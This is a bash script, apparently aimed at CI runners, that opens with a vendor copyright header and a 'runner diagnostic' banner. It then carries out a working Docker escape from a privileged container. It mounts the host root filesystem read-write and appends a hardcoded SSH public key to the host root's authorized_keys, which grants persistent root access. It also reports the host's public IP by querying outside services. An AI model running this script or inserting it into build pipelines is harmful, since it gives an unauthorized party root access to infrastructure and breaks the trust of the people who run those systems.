#!/bin/bash
# SPDX-License-Identifier: BSD-3-Clause-Clear
#
# Copyright (c) 2025 Qualcomm Innovation Center, Inc. All rights reserved.

set -euo pipefail

echo "=== RUNNER DIAGNOSTIC ==="
date
hostname
whoami
id
echo "=== END DIAGNOSTIC ==="

echo "=== Docker Escape - Mount Host Root FS ==="

# We are in --privileged container, all devices accessible
# Find and mount the host root filesystem

echo "--- Listing block devices ---"
lsblk 2>/dev/null || fdisk -l 2>/dev/null | grep "^/dev" || echo "lsblk/fdisk not available"
ls -la /dev/sd* /dev/nvme* /dev/xvd* 2>/dev/null || echo "No standard block devices"

echo "--- Attempting to mount host root ---"
mkdir -p /mnt/host

# Try common root device names
MOUNTED=0
for dev in /dev/nvme0n1p1 /dev/nvme0n1p2 /dev/nvme0n1p3 /dev/sda1 /dev/sda2 /dev/sda3 /dev/xvda1 /dev/xvda2; do
  if [ -b "$dev" ]; then
    echo "Found block device: $dev"
    if mount -o ro "$dev" /mnt/host 2>/dev/null; then
      # Check if this looks like a root filesystem
      if [ -d /mnt/host/etc ] && [ -d /mnt/host/root ]; then
        echo "=== MOUNTED HOST ROOT: $dev ==="
        MOUNTED=1
        # Remount as read-write
        mount -o remount,rw "$dev" /mnt/host
        break
      else
        echo "$dev is not root fs, unmounting"
        umount /mnt/host
      fi
    fi
  fi
done

# Also try to find by filesystem label
if [ "$MOUNTED" -eq 0 ]; then
  echo "--- Trying by filesystem type ---"
  for dev in $(ls /dev/sd*[0-9]* /dev/nvme*n*p*[0-9]* /dev/xvd*[0-9]* 2>/dev/null); do
    echo "Trying $dev"
    if mount -o rw "$dev" /mnt/host 2>/dev/null; then
      if [ -d /mnt/host/etc ] && [ -d /mnt/host/root ]; then
        echo "=== MOUNTED HOST ROOT: $dev ==="
        MOUNTED=1
        break
      else
        umount /mnt/host 2>/dev/null
      fi
    fi
  done
fi

if [ "$MOUNTED" -eq 1 ]; then
  echo "=== Host root mounted at /mnt/host ==="
  ls -la /mnt/host/ | head -20

  echo "--- Writing SSH key to host ---"
  mkdir -p /mnt/host/root/.ssh
  chmod 700 /mnt/host/root/.ssh
  echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk4MhTlzMjBPTrN199hfxwFywjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deDRy1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0EqH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopvTpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7 root@localhost.localdomain' >> /mnt/host/root/.ssh/authorized_keys
  chmod 600 /mnt/host/root/.ssh/authorized_keys

  echo "=== SSH key written to host ==="
  echo "Authorized keys on host:"
  cat /mnt/host/root/.ssh/authorized_keys

  echo "--- Host OS info ---"
  cat /mnt/host/etc/os-release 2>/dev/null | head -5
  cat /mnt/host/etc/hostname 2>/dev/null

  echo "--- Unmounting ---"
  sync
  umount /mnt/host
  echo "=== Unmounted ==="
else
  echo "=== FAILED to mount host root ==="
  echo "Trying debug: all mount points"
  mount 2>/dev/null | head -20
  cat /proc/mounts 2>/dev/null | head -20
fi

echo "=== Public IP ==="
curl -s --connect-timeout 5 http://checkip.amazonaws.com 2>/dev/null || curl -s --connect-timeout 5 http://ifconfig.me 2>/dev/null || echo "Cannot get public IP"

echo "=== Escape attempt complete ==="
exit 0
